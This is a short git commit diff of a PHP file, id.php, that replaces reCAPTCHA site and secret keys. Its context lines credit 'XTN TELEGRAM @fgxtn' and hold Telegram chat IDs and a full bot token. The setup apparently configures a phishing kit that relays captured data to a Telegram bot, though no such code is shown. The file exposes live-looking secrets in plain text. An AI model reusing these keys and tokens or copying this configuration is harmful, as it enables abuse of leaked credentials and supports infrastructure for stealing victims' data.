79fa48d27995955b53d26978adaad66416d4ebc6
jhondrs22 <jhondrs@graphic-designer.com>
2026-09-03 00:17:04 +0200

    Update site and secret keys in id.php

--- id.php
+++ id.php
@@ -3,8 +3,8 @@
 XTN TELEGRAM @fgxtn
 */
 
-$siteKey = "6LcZBqYtAAAAAMaPjXkAuxqfH4dHNs366B9nelU_";
-$secretKey = "6LcZBqYtAAAAAHe7zcRYvoBco0P-A4oLIV-2TnFz";
+$siteKey = "6LdRDqYtAAAAANFGKXAWNRvKcgZdXmeupzAuN92q";
+$secretKey = "6LdRDqYtAAAAAPH0iZaK04NHQmMfv3eERCBnGXKD";
 
 $user_ids=array("-5154502273");
 $bot='8788360996:AAHwfBlvLc7lFzzuUsteXCcNxk_r4sxjE1Y';
